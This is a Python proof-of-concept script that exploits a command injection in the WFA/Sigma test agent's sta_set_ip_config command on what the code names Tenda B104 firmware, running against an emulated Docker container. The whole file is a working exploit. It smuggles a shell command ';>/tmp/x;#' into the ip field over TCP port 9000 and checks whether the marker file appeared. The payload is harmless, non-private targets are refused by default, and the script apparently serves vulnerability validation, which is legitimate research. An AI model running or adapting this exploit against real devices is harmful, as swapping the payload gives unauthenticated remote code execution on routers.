#!/usr/bin/env python3
"""
PoC: WFA/Sigma command injection through sta_set_ip_config ip field.

The vulnerable field is short/truncated in this firmware, so this PoC uses a
compact payload that creates /tmp/x inside the emulated firmware rootfs.
"""

import argparse
import ipaddress
import socket
import subprocess
import sys
import time


def require_private_host(host, allow_nonlocal):
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def docker_sh(container, command):
    return subprocess.run(["docker", "exec", container, "/bin/sh", "-c", command], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout


def firmware_root_expr():
    return 'pid=$(ps | awk \'/[w]fa_dut/{print $1; exit}\'); root=$(readlink /proc/$pid/root); '


def docker_out(args):
    return subprocess.run(args, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout.strip()


def discover_container(prefix):
    names = docker_out(["docker", "ps", "--format", "{{.Names}}"]).splitlines()
    matches = [name for name in names if name.startswith(prefix)]
    if not matches:
        raise SystemExit(f"could not find running container with name prefix {prefix!r}; pass --container and --host")
    return matches[0]


def discover_ip(container):
    ip = docker_out(["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", container])
    if not ip:
        raise SystemExit(f"could not discover Docker IP for {container}; pass --host")
    return ip


def send_cmd(host, port, command):
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall((command + "\r\n").encode())
        sock.settimeout(5)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks).decode(errors="replace")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="")
    parser.add_argument("--port", type=int, default=9000)
    parser.add_argument("--container", default="")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    if not args.container:
        args.container = discover_container("tenda-b104-rcd-procd")
    if not args.host:
        args.host = discover_ip(args.container)

    require_private_host(args.host, args.allow_nonlocal)
    marker = "/tmp/x"
    docker_sh(args.container, firmware_root_expr() + f'rm -f "$root{marker}"')
    command = (
        "sta_set_ip_config,interface,ra0,dhcp,0,"
        "ip,1;>/tmp/x;#,mask,255.255.255.0,"
        "defaultGateway,192.0.2.1,primary-dns,1.1.1.1,secondary-dns,8.8.8.8"
    )
    response = send_cmd(args.host, args.port, command)
    time.sleep(0.5)
    marker_listing = docker_sh(args.container, firmware_root_expr() + f'ls -l "$root{marker}" 2>/dev/null || true').strip()
    vulnerable = bool(marker_listing)

    print(f"[target] {args.host}:{args.port} container={args.container}")
    print("[exploit] " + command)
    print("[response] " + response.strip())
    print("[validation] " + marker)
    print("  marker=" + repr(marker_listing))
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N/C:H/I:H/A:H candidate if WFA port is reachable")
    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
